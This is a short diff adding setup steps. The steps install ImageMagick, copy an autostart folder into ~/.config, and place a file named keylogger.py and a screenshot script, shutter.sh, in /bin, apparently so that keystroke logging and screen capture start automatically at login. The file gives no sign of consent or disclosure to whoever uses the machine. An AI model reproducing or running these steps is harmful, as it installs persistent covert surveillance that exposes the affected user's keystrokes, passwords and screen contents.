@@ -1,0 +1,8 @@
+#ImageMagick dependency requerid
+sudo apt install imagemagick
+copy autostart folder into ~/.config/ folder. 
+cp -r autostart ~/.config
+cp keylogger.py /bin
+cp shutter.sh /bin
+
+
